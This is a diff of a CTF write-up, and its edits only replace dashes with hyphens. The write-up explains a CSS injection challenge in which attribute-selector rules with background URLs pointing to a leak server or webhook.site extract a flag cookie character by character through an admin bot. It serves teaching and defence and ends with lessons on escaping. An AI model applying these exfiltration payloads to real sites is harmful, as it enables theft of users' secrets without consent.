@@ -29,15 +29,15 @@ a time to an attacker-controlled server, without ever executing JavaScript.
 
 Two services, wired together with `compose.yaml`:
 
-- **`web`** (`web/app.py`, Flask) — renders an "artwork" page. Three query
+- **`web`** (`web/app.py`, Flask) - renders an "artwork" page. Three query
   parameters (`artist`, `title`, `artwork`) are reflected into the page. The
   current session's flag is set as a cookie named `FLAG` and rendered into
   the HTML.
-- **`bot`** (`bot/`, Express + Puppeteer) — a "report to admin" service.
+- **`bot`** (`bot/`, Express + Puppeteer) - a "report to admin" service.
   Given a `path`, it visits `APP_URL + path` in a headless Chromium browser
   that has the real `FLAG` cookie set, simulating an admin/victim. This is
   the classic "XSS bot" pattern used in CTFs, except here there's no
-  scripting available — it's a **CSS injection** bot.
+  scripting available - it's a **CSS injection** bot.
 
 ### The injection point
 
@@ -64,8 +64,8 @@ def index():
 - `artwork` is dropped into the page with the `| safe` filter, meaning Jinja2
   will **not** HTML-escape it. It lands directly inside a `<style>` element,
   so an attacker fully controls the CSS on the page.
-- The flag itself, `Alpaca{[A-Z]{1,6}}`, is placed both as text and — more
-  usefully for us — as the value of the `data-flag` HTML attribute on a
+- The flag itself, `Alpaca{[A-Z]{1,6}}`, is placed both as text and - more
+  usefully for us - as the value of the `data-flag` HTML attribute on a
   `<span>`. Attribute values are exactly what CSS attribute selectors can
   match against.
 
@@ -90,8 +90,8 @@ response.headers["Content-Security-Policy"] = (
   `<style>` block we're injecting into.
 - `img-src *` is the deliberate hole (there's even a comment in the source
   hinting at it: `# This might be a good idea for exfiltration ;)`). Any
-  request that the browser classifies as an "image" load — including CSS
-  `background`/`background-image`/`list-style-image` — can go to **any**
+  request that the browser classifies as an "image" load - including CSS
+  `background`/`background-image`/`list-style-image` - can go to **any**
   origin.
 
 So: no JS, but a fully-controlled `<style>` block, and an unrestricted
@@ -112,11 +112,11 @@ browser will fetch the background image **only for the rule that actually
 matches** the real attribute value. Whichever URL gets requested tells us
 information about the secret string, without ever running JavaScript.
 
-Since the flag format is fixed (`Alpaca{` + 1–6 uppercase letters + `}`), we
+Since the flag format is fixed (`Alpaca{` + 1-6 uppercase letters + `}`), we
 can brute-force it one character at a time:
 
 1. For a known prefix (starting with `Alpaca{`), emit 26 CSS rules, one per
-   letter A–Z, each with a unique background URL:
+   letter A-Z, each with a unique background URL:
 
    ```css
    [data-flag^="Alpaca{A"]{background:url(https://leak-server/leak?c=A)}
@@ -127,9 +127,9 @@ can brute-force it one character at a time:
 
    Only the rule whose prefix actually matches the real flag will cause
    Chromium to issue a background-image request. Our leak server's access
-   log tells us exactly which one fired — that's the next character.
+   log tells us exactly which one fired - that's the next character.
 
-2. Add one more rule to detect when the flag is *finished* — i.e. the
+2. Add one more rule to detect when the flag is *finished* - i.e. the
    closing `}` immediately follows our currently-known prefix:
 
    ```css
@@ -138,7 +138,7 @@ can brute-force it one character at a time:
 
    **Important bug to avoid:** an *end* check written as
    `[data-flag^="Alpaca{"][data-flag$="}"]` (starts with `Alpaca{` AND ends
-   with `}`) is wrong — that's true for *every* valid flag regardless of
+   with `}`) is wrong - that's true for *every* valid flag regardless of
    length, so it fires immediately as a false positive. The correct check
    anchors the closing brace directly onto the currently-known prefix using
    a single `^=` (starts-with) selector, so it only matches once the full
@@ -150,7 +150,7 @@ can brute-force it one character at a time:
 ### Delivery mechanism
 
 The `bot` container is the only thing that ever holds the real
-`FLAG` cookie. We can't visit the page ourselves and see the flag — we have
+`FLAG` cookie. We can't visit the page ourselves and see the flag - we have
 to get the bot to visit a URL of our choosing and have *it* leak the value
 out via the CSS background-image side channel.
 
@@ -165,7 +165,7 @@ app.post("/api/report", async (req, res) => {
 });
 ```
 
-So we POST a `path` (query string only — no leading slash, since `APP_URL`
+So we POST a `path` (query string only - no leading slash, since `APP_URL`
 already ends in `/`) containing our malicious `artwork` payload, e.g.:
 
 ```
@@ -173,14 +173,14 @@ path = "?artwork=<url-encoded CSS>"
 ```
 
 `bot.js` launches headless Chromium, sets the real `FLAG` cookie, navigates
-to `APP_URL + path`, and waits 5 seconds — plenty of time for our CSS rules
+to `APP_URL + path`, and waits 5 seconds - plenty of time for our CSS rules
 to be evaluated and the matching background-image request to fire.
 
 ### Exfil destination
 
 Since `img-src *` allows any origin, we just need something to receive and
 show us the requests. [webhook.site](https://webhook.site) works well for
-this without needing our own public server — the bot's headless Chromium
+this without needing our own public server - the bot's headless Chromium
 (wherever it's hosted) just needs outbound internet access to it.
 
 ## Putting It Together
@@ -236,7 +236,7 @@ end → FLAG: Alpaca{CUSTOM}
 
 - **Never render user input into a `<style>` block (or anywhere) with
   `| safe`/without escaping**, even if you think "it's just CSS, what's the
-  worst that could happen." CSS alone — with no JavaScript at all — is a
+  worst that could happen." CSS alone - with no JavaScript at all - is a
   fully capable side channel for exfiltrating any data placed in DOM
   attributes, via attribute selectors and conditional resource loads
   (`background-image`, `list-style-image`, `cursor: url(...)`, custom
